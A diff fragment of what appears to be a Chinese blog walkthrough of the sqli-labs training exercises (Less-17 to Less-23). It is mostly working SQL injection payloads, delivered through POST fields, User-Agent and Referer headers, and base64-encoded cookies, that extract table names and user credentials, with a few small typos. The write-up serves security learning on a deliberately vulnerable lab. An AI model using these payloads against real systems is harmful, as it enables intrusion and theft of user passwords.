class="line">`uname=admin&amp;passwd=&apos; or updatexml(1,concat(&apos;#&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)),0)--+`</span><br><span class="line"></span><br><span class="line">![kxm8rn.png](https://s2.ax1x.com/2019/03/07/kxm8rn.png)</span><br><span class="line"></span><br><span class="line">**注意：**这里不要用`concat_ws()`，会有未知错误使错误回显显示不全。</span><br><span class="line"></span><br><span class="line">**爆列**</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or updatexml(1,concat(&apos;#&apos;,(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)),0)--+`</span><br><span class="line"></span><br><span class="line">![kxnmLR.png](https://s2.ax1x.com/2019/03/07/kxnmLR.png)</span><br><span class="line"></span><br><span class="line">**爆内容**</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or updatexml(1,concat(&apos;#&apos;,(select concat(id,&apos;#&apos;,username,&apos;#&apos;,password) from users limit 0,1)),0)--+`</span><br><span class="line"></span><br><span class="line">![kxn6yj.png](https://s2.ax1x.com/2019/03/07/kxn6yj.png)</span><br><span class="line"></span><br><span class="line">报错，`You can&apos;t specify target table &apos;users&apos; for update in FROM clause`&gt;您无法在FROM子句中为更新指定目标表&apos;users&apos;</span><br><span class="line"></span><br><span class="line">意思是不能先`select`表中的某些值，再`update`这个表（在同一语句中）。</span><br><span class="line"></span><br><span class="line">**解决方法：**将`select`出的结果作为**派生表**再`select`一遍，这样就规避了错误。</span><br><span class="line"></span><br><span class="line">**注意：**此问题只出现于MySQL，msSQL和Oracle不会出现此问题。</span><br><span class="line"></span><br><span class="line">`uname=admin&amp;passwd=&apos; or updatexml(1,concat(&apos;#&apos;,(select * from (select concat_ws(&apos;#&apos;,id,username,password) from users limit 0,1) a)),0)--+`</span><br><span class="line"></span><br><span class="line">![kxuEAP.png](https://s2.ax1x.com/2019/03/07/kxuEAP.png)</span><br><span class="line"></span><br><span class="line">**注意：**这里的错误信息只显示了一部分，所以没有一次性输出所有数据（可以做到），而使用`limit`偏移注入。</span><br><span class="line"></span><br><span class="line">### Less-18</span><br><span class="line"></span><br><span class="line">[原文链接](https://www.jianshu.com/p/c876a7f96eb5)</span><br><span class="line"></span><br><span class="line">#### 分析</span><br><span class="line"></span><br><span class="line">![kxMdT1.png](https://s2.ax1x.com/2019/03/07/kxMdT1.png)</span><br><span class="line"></span><br><span class="line">尝试了很多次之后，发现回显能够显示你的IP地址，看一下源码。</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">$uagent = $_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">$IP = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br></pre></td></tr></table></figure></p>
+<p>本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于<code>mysql_query()</code>，可使用本函数来预防数据库攻击。</p>
 </blockquote>
+<p><strong>intval</strong>()函数</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; intval(var[,base])</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>var</td>
+<td>要转换成integer的数量值</td>
+</tr>
+<tr>
+<td>base</td>
+<td>转化所使用的进制</td>
+</tr>
+</tbody>
+</table>
+<p><code>intval()</code>函数获取变量的整数值。通过使用指定的进制<code>base</code>转换（默认是十进制），返回变量<code>var</code>的<code>integer</code>数值。<code>intval()</code>不能用于<code>object</code>，否则会产生<code>E_NOTICE</code>错误并返回<code>1</code>。</p>
+<p>成功时返回<code>var</code>的<code>integer</code>值，失败时返回<code>0</code>。空的<code>array</code>返回<code>0</code>，非空的<code>array</code>返回<code>1</code>，最大的值取决于操作系统。</p>
+<blockquote>
+<p>如果<code>base</code>是<code>0</code>，通过检测<code>var</code>的格式来决定使用的进制：</p>
+<ul>
+<li>如果字符串包括了<code>0x</code>或<code>0X</code>的前缀，使用16进制<code>hex</code>；否则，</li>
+<li>如果字符串以<code>0</code>开始，使用8进制<code>octal</code>；否则，</li>
+<li>使用10进制<code>decimal</code>。</li>
+</ul>
+</blockquote>
+<p><strong>有参数检查与过滤</strong></p>
+<p><strong>注意：</strong>在用<code>uanme</code>查询之前，它用<code>check_input()</code>函数做了检查。</p>
+<blockquote>
+<p><strong>1</strong>. 若<code>uname</code>非空，截取它的前15个字符。<br> <strong>2</strong>. 若php环境变量<code>magic_quotes_gpc</code>打开，去除转义的反斜杠<code>\</code>。<br> <strong>3</strong>. 若<code>uname</code>字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。</p>
+</blockquote>
+<p>所以我们几乎不可能在<code>uname</code>处注入，唯一的注入点在<code>passwd</code>处。</p>
+<p><strong>子查询注入</strong></p>
+<blockquote>
+<p>当在一个聚合函数如<code>count()</code>函数后面，如果使用分组语句如<code>group by</code>就会把查询的一部分以错误的形式显示出来。</p>
+</blockquote>
+<p><strong>选择哪种方式</strong></p>
+<p>子查询注入在Less-5中即双注入，对于<code>update</code>、<code>delete</code>和<code>insert</code>通常都用结合<code>or</code>的逻辑判断。</p>
+<blockquote>
+<p>在后台是<code>select</code>语句时我们能通过<code>union</code>联合查询<strong>CONCAT子查询</strong>（即Less5使用的双注入）获得错误信息中的数据。<br> 而这里的后台是<code>update</code>（<code>delete</code>/<code>insert</code>）语句，我们只能通过<code>or</code>逻辑判断<strong>派生表</strong>（在Less5中提到一句）来获得错误信息中的数据。</p>
+</blockquote>
+<p>注意：**上面这段是根据实际情况推断出的，但没有触及原理，也不完全正确。经过对比Less5的两种子查询和查找资料，得到了正确的结论。</p>
+<p>使用<strong>CONCAT子查询</strong>时，错误信息提示子查询中应该只包含一个字段。</p>
+<p><code>uname=admin&amp;passwd=&#39; or (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a) where username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kvryRg.png" alt="kvryRg.png"></p>
+<p>使用<strong>派生表</strong>时，错误信息能返回我们想要的数据。</p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2)) as a from information_schema.tables group by a)b) where  username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kvyCNV.png" alt="kvyCNV.png"></p>
+<p>在下一步之前，我们先理清<a href="https://www.yiibai.com/mysql/subquery.html" target="_blank" rel="noopener">子查询</a>与<a href="https://www.yiibai.com/mysql/derived-table.html" target="_blank" rel="noopener">派生表</a>。</p>
+<p><strong>子查询与派生表</strong></p>
+<blockquote>
+<p>子查询有两种：一是<strong>WHERE子句中</strong>的子查询；二是<strong>FROM子句中</strong>的子查询，这种子查询又被称为<strong>派生表</strong>。</p>
+</blockquote>
+<ul>
+<li><strong>WHERE子句中：</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name IN (SELECT column_name</span><br><span class="line">                      FROM table_name</span><br><span class="line">                      WHERE condition)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>FROM子句中：</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name</span><br><span class="line">FROM (SELECT column_name</span><br><span class="line">      FROM table_name</span><br><span class="line">      WHERE condition) derived_table_name</span><br><span class="line">WHERE condition</span><br></pre></td></tr></table></figure>
+<p>可以看出这两种实际上<strong>并无区别</strong>！</p>
+<p>只是在<strong>Less-5</strong>中<code>select</code>查询返回的字段数为<strong>3</strong>，足够在<code>column_list</code>中将<code>count()</code>和<code>concat()</code>都包含进去，所以用<strong>CONCAT子查询</strong>更简单。</p>
+<p>而在<strong>Less-17</strong>中<code>update</code>查询返回的字段数只有<strong>1</strong>！不足以使<code>count()</code>后接上<code>concat()</code>这样一个查询语句，这时候就只能通过<strong>派生表</strong>再将上一层子查询包裹起来，通过<code>select 1 from (报错的CONCAT子查询) derived_table_name</code>使注入查询的字段与<code>update</code>查询的字段数相等！</p>
+<p>（严格来说，这里已经不能叫双注入而是三注入了，都称为子查询注入）</p>
+<p><strong>所以，子查询注入重点在于控制子查询使涉及字段数相等。select使用union，update/delete/insert使用or。而CONCAT子查询或是派生表只是手段。</strong></p>
+<h4 id="派生表注入过程"><a href="#派生表注入过程" class="headerlink" title="派生表注入过程"></a>派生表注入过程</h4><p><strong>爆库</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kv6pKH.png" alt="kv6pKH.png"></p>
+<p><strong>爆表</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),floor(rand()*2)) as a from information_schema.tables group by a)b) where username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kv6HSS.png" alt="kv6HSS.png"></p>
+<p>一直没成功<strong>Subquery returns more than 1 row</strong>子查询返回多行</p>
+<p>于是用limit来限制范围，一条一条的来查询，结果一直找不到limit放的位置，以后在研究吧。</p>
+<p><strong>爆字段</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;admin&#39;--+</code></p>
+<p>这个也一样<strong>Subquery returns more than 1 row</strong></p>
+<p><strong>爆内容</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or (select 1 from (select count(*),concat_ws(&#39;-&#39;,(**select concat_ws(&#39;-&#39;,id,username,password) from users limit 0,1**),floor(rand()*2))as a from information_schema.tables group by a) b) where username=&#39;admin&#39;--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/06/kvfusU.png" alt="kvfusU.png"></p>
+<p>不知道为啥开始也报了几次<strong>Subquery returns more than 1 row</strong>，多提交了几次就可以了。</p>
+<h4 id="updatexml-注入"><a href="#updatexml-注入" class="headerlink" title="updatexml()注入"></a>updatexml()注入</h4><p> updatexml()函数</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; updatexml(xml_target,xpath_expr,new_xml)</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>xml_target</td>
+<td>目标xml，形式类似于节点目录</td>
+</tr>
+<tr>
+<td>xpath_expr</td>
+<td>xml的表达式（xpath格式）</td>
+</tr>
+<tr>
+<td>new_xml</td>
+<td>用来替换的xml</td>
+</tr>
+</tbody>
+</table>
+<p><code>updatexml()</code>函数是MySQL对xml文档数据进行查询和修改的xpath函数。</p>
+<p>简单来说就是，用<code>new_xml</code>把<code>xml_target</code>中包含<code>xpath_expr</code>的部分节点（包括<code>xml_target</code>）替换掉。</p>
+<p>如：updatexml(<a><b><c>asd</c></b><e></e></a>, ‘//b’, <f>abc</f>)，</p>
+<p>运行结果：<a><f>abc</f><e></e></a>，</p>
+<p>其中’//b’的斜杠表示不管b节点在哪一层都替换掉，而’/b’则是指在根目录下替换，此处xml_target的根目录节点是a。</p>
+<p>注入原理</p>
+<p><code>updatexml()</code>的<code>xml_target</code>和<code>new_xml</code>参数随便设定一个数，这里主要是利用报错返回信息。利用<code>updatexml()</code>获取数据的固定payload是：</p>
+<blockquote>
+<p><code>... or updatexml(1,concat(&#39;#&#39;,(select * from (select ...) a)),0) ...</code></p>
+</blockquote>
+<h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><p><strong>爆库</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(database())),0)--+</code></p>
+<p><code>&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)#</code>     0x7e表示~</p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxeqgJ.png" alt="kxeqgJ.png"></p>
+<p><strong>注意：</strong>因为<code>xpath_expr</code>是xpath格式，所以不是所有字符都可以作为<code>concat()</code>的连接符，如<code>-</code>、<code>@</code>便不可以。</p>
+<p><strong>爆表</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxm8rn.png" alt="kxm8rn.png"></p>
+<p><strong>注意：</strong>这里不要用<code>concat_ws()</code>，会有未知错误使错误回显显示不全。</p>
+<p><strong>爆列</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxnmLR.png" alt="kxnmLR.png"></p>
+<p><strong>爆内容</strong></p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select concat(id,&#39;#&#39;,username,&#39;#&#39;,password) from users limit 0,1)),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxn6yj.png" alt="kxn6yj.png"></p>
+<p>报错，<code>You can&#39;t specify target table &#39;users&#39; for update in FROM clause</code>&gt;您无法在FROM子句中为更新指定目标表’users’</p>
+<p>意思是不能先<code>select</code>表中的某些值，再<code>update</code>这个表（在同一语句中）。</p>
+<p><strong>解决方法：</strong>将<code>select</code>出的结果作为<strong>派生表</strong>再<code>select</code>一遍，这样就规避了错误。</p>
+<p><strong>注意：</strong>此问题只出现于MySQL，msSQL和Oracle不会出现此问题。</p>
+<p><code>uname=admin&amp;passwd=&#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0)--+</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/07/kxuEAP.png" alt="kxuEAP.png"></p>
+<p><strong>注意：</strong>这里的错误信息只显示了一部分，所以没有一次性输出所有数据（可以做到），而使用<code>limit</code>偏移注入。</p>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p><a href="https://www.jianshu.com/p/c876a7f96eb5" target="_blank" rel="noopener">原文链接</a></p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img src="https://s2.ax1x.com/2019/03/07/kxMdT1.png" alt="kxMdT1.png"></p>
+<p>尝试了很多次之后，发现回显能够显示你的IP地址，看一下源码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br></pre></td></tr></table></figure>
 <p>源码使用<code>HTTP_USER_AGENT</code>只获取了HTTP请求头的一个部分：<code>User-Agent</code>。<br> 而获取IP则使用了<code>REMOTE_ADDR</code>，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但非修改XFF头就可以更改的。</p>
 <p>再看源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br></pre></td></tr></table></figure>
@@ -729,7 +952,7 @@ height:50vh;
 <p><strong>爆内容</strong></p>
 <p><code>User-Agent: &#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0),&#39;&#39;,&#39;&#39;)#</code></p>
 <p><img src="https://s2.ax1x.com/2019/03/07/kxtOHS.png" alt="kxtOHS.png"></p>
-<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>登录后，回显Referer信息，</p>
+<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>登录后，回显Referer信息，</p>
 <p><img src="https://s2.ax1x.com/2019/03/07/kxNkHU.png" alt="kxNkHU.png"></p>
 <p>登录成功后发现回显的是<code>Referer</code>不是<code>User-Agent</code>，判断<code>INSERT</code>语句结构：</p>
 <p><code>Referer: Specter&#39; updatexml(1,concat(&#39;#&#39;,(database())),0)#</code></p>
@@ -744,7 +967,7 @@ height:50vh;
 <p><strong>爆表</strong>：<code>Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),0),&#39;&#39;)#</code></p>
 <p><strong>爆内容</strong>：<code>Referer: &#39; or updatexml(1,concat(&#39;#&#39;,(select * from (select concat_ws(&#39;#&#39;,id,username,password) from users limit 0,1) a)),0),&#39;&#39;)#</code></p>
 <h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>原文：<a href="https://www.jianshu.com/p/f77ab78dcd35" target="_blank" rel="noopener">https://www.jianshu.com/p/f77ab78dcd35</a></p>
-<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>登录失败</p>
+<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>登录失败</p>
 <p><img src="https://s2.ax1x.com/2019/03/07/kxUPGd.png" alt="kxUPGd.png"></p>
 <p>登录成功</p>
 <p><img src="https://s2.ax1x.com/2019/03/07/kxUiRA.png" alt="kxUiRA.png"></p>
@@ -770,7 +993,7 @@ height:50vh;
 <li>用<code>Burp</code>修改登陆<code>(POST)</code>成功后刷新时<code>GET</code>请求头中的<code>Cookie</code>值注入，这种方式不会修改本地的<code>Cookie</code>文件。</li>
 </ol>
 <p>接下来将重点演示第一种途径的注入。</p>
-<h4 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h4><p>我们得出后台根据<code>Cookie</code>中的<code>uname</code>查询用户的所有信息，即这是个<code>SELECT</code>语句，我们可以使用最简单的<code>UNION</code>注入。</p>
+<h4 id="注入过程-1"><a href="#注入过程-1" class="headerlink" title="注入过程"></a>注入过程</h4><p>我们得出后台根据<code>Cookie</code>中的<code>uname</code>查询用户的所有信息，即这是个<code>SELECT</code>语句，我们可以使用最简单的<code>UNION</code>注入。</p>
 <p><code>uname=Dumb&#39;</code></p>
 <p><img src="https://s2.ax1x.com/2019/03/07/kxfFAJ.png" alt="kxfFAJ.png"></p>
 <p><code>uname=Dumb&#39; order by 3#</code>回显正确，说明有三个字段。</p>
@@ -800,11 +1023,100 @@ height:50vh;
 <p>同样burpsuite也可以，</p>
 <p><img src="https://s2.ax1x.com/2019/03/07/kxIqWd.png" alt="kxIqWd.png"></p>
 <p>总算把前20关写完了。多亏了<a href="https://www.jianshu.com/u/f5a5bfa4f659" target="_blank" rel="noopener">Hyafinthus</a>的题解。</p>
-<h2 id="Less-21-to-Less30"><a href="#Less-21-to-Less30" class="headerlink" title="Less-21 to Less30"></a>Less-21 to Less30</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>还是和上一关一样，输入用户名登录，uname=Dumb，passwd=Dumb，登陆之后，可以看到和上一关的很像，但是还是有差别的，<code>uname=Dumb</code>变成了<code>uname = RHVtYg==</code></p>
+<h2 id="Less-21-to-Less30"><a href="#Less-21-to-Less30" class="headerlink" title="Less-21 to Less30"></a>Less-21 to Less30</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>还是和上一关一样，输入用户名登录，uname=Dumb，passwd=Dumb，登陆之后，可以看到和上一关的很像，但是还是有差别的，<code>uname=Dumb</code>变成了<code>uname = RHVtYg==</code></p>
 <p><img src="https://s2.ax1x.com/2019/03/11/ACWTIO.png" alt="ACWTIO.png"></p>
-<p>很明显是将Dumb进行base64编码，可以在线测试一下，<a href="https://base64.supfree.net/" target="_blank" rel="noopener">base64</a>编码之后验证了确实是Dumb的base64编码，查看cookie之后，发现也是base64编码的</p>
-<p><img src="https://s2.ax1x.com/2019/03/11/ACfEyn.png" alt="ACfEyn.png"></p>
-<h4 id="注入-2"><a href="#注入-2" class="headerlink" title="注入"></a>注入</h4>
+<p>很明显是将Dumb进行base64编码，可以在线测试一下，<a href="https://base64.supfree.net/" target="_blank" rel="noopener">base64</a>编码之后验证了确实是Dumb的base64编码，查看cookie之后，发现也是base64编码的，</p>
+<h4 id="注入-2"><a href="#注入-2" class="headerlink" title="注入"></a>注入</h4><p>开始注入，发现了一个问题，</p>
+<blockquote>
+<p>uname=Dumb’</p>
+<p><a href="https://base64.supfree.net/" target="_blank" rel="noopener">base64</a>在线加密<code>Dumb&#39;</code>后,即base64(Dumb’)=<code>RHVtYiUyNw==</code></p>
+</blockquote>
+<p>用这个值去修改cookie值之后，发现会有如下警告，猜测是base64最后的表示问题</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APvuIe.png" alt="APvuIe.png"></p>
+<p>所以，写一个简单的python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1=<span class="string">"Dump'"</span></span><br><span class="line">str2=base64.b64encode(str1)</span><br><span class="line">print(str2)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>uname=Dumb’</p>
+<p>base64=RHVtcCc=</p>
+</blockquote>
+<p><img src="https://s2.ax1x.com/2019/03/12/APxEWj.png" alt="APxEWj.png"></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APvF2R.png" alt="APvF2R.png"></p>
+<p>直接得出 SQL 语句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name WHERE username=(<span class="string">'$cookie_uname'</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>即单引号加括号闭合</p>
+<p><strong>爆库</strong></p>
+<p><code>uname=1&#39;) union select 1,2,database()#</code></p>
+<p><code>base64: RHVtcCcpIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSM=</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APxd0K.png" alt="APxd0K.png"></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APxDte.png" alt="APxDte.png"></p>
+<p><strong>爆表</strong></p>
+<p><code>uname=1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=security&#39;#</code></p>
+<p><code>base64: RHVtYicpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9c2VjdXJpdHknIw==</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/APzJUS.png" alt="APzJUS.png"></p>
+<p><strong>爆列</strong></p>
+<p><code>uname = 1&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;#</code></p>
+<p><code>base64: MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknIGFuZCB0YWJsZV9uYW1lPSd1c2Vycycj</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiSJqx.png" alt="AiSJqx.png"></p>
+<p><strong>爆内容</strong></p>
+<p><code>uname=1&#39;) union select 1,2,group_concat(concat_ws(&#39;-&#39;,id,username,password)) from user#</code></p>
+<p><code>base64: MScpIHVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KGNvbmNhdF93cygnLScsaWQsdXNlcm5hbWUscGFzc3dvcmQpKSBmcm9tIHVzZXJzIw==</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiSdiD.png" alt="AiSdiD.png"></p>
+<h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p><code>uname=1&quot;</code>双引号闭合，其他和Less-21一样。</p>
+<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>作者：Hyafinthus</p>
+<p>链接：<a href="https://www.jianshu.com/p/2602430f8ee4" target="_blank" rel="noopener">https://www.jianshu.com/p/2602430f8ee4</a></p>
+<h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p><code>id=1&#39;</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/Aik3t0.png" alt="Aik3t0.png"></p>
+<p>可以看出是单引号闭合的查询，这里报错还把站点路径爆出来了。</p>
+<p>看了看源码，发现有preg_replace()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p> preg_replace(pattern,replacement,subject[,limit=-1[,&amp;count]])</p>
+</blockquote>
+<p><code>preg_replace()</code>函数执行一个正则表达式的搜索和替换，搜索<code>subject</code>中匹配<code>pattern</code>的部分， 以<code>replacement</code>进行替换。</p>
+<p>如果<code>subject</code>是一个数组，<code>preg_replace()</code>返回一个数组，其他情况下返回一个字符串。<br> 如果匹配被查找到，替换后的<code>subject</code>被返回，其他情况下返回没有改变的<code>subject</code>。如果发生错误，返回<code>NULL</code>。</p>
+<p>在这关中，也只是将<code>#</code>和<code>--</code>替换成了<code>空字符</code>。</p>
+<p>判断字段数时问题来了：尝试两种注释方式发现报错回显中<code>LIMIT</code>语句仍在起作用，注释没有起作用，即使把<code>#</code>URL编码为<code>%23</code>仍被过滤。</p>
+<p>这时就要分析 SQL 语句找到绕过注入的方式，后台的查询语句是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table_name WHERE id=&apos;$id&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+<p>注入点在<code>id</code>处，我们要判断字段数用的是<code>order by</code>子句，同时闭合第二个单引号：</p>
+<blockquote>
+<p>SELECT * FROM table_name WHERE id=1’ order by 4 and ‘1’=’1 LIMIT 0,1</p>
+</blockquote>
+<p>本意是能从报错信息判断查询返回表共有几个字段，但是回显很正常：</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiVZp6.png" alt="AiVZp6.png"></p>
+<p>这是因为：</p>
+<blockquote>
+<p><code>where</code>与<code>order by</code>是子句，<code>and</code>是操作符，用于<code>where</code>子句。<br> 在MySQL的执行顺序中，<code>where</code>是远在<code>order by</code>前面的。</p>
+<p>在第一个查询语句中，<code>id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;</code>作为<code>where</code>的条件，先被执行，得到结果集；然后是<code>order by</code>，因结果集中无第四个字段所以报错。</p>
+<p>在第二个查询语句中，<code>order by</code>在<code>where</code>的条件中，在<code>where</code>执行时被忽略了，结果集生成后并未再执行<code>order by</code>。</p>
+</blockquote>
+<p>所以这关不能用<code>order by</code>来判断字段数，而要用<code>union</code>：</p>
+<blockquote>
+<p>SELECT * FROM table_name WHERE id=’<strong>1’ union select 1,2,3,4 or ‘1’=’1</strong>‘  LIMIT 0,1</p>
+</blockquote>
+<p>这里的<code>or</code>作为了联合查询第二个语句的条件而不是第一个语句<code>where</code>的条件。</p>
+<p><code>?id=1&#39; union select 1,2,3,4 or &#39;1&#39;=&#39;1</code></p>
+<p>当<code>select</code>加到<code>4</code>时报错，得出共<code>3</code>个字段。</p>
+<p>注入时闭合查询语句即绕过过滤如下：</p>
+<blockquote>
+<p>SELECT * FROM table_name WHERE id=’<strong>-1’ union [select c_1,c_2,(c_3] or ‘1’=’1</strong>‘)  LIMIT 0,1</p>
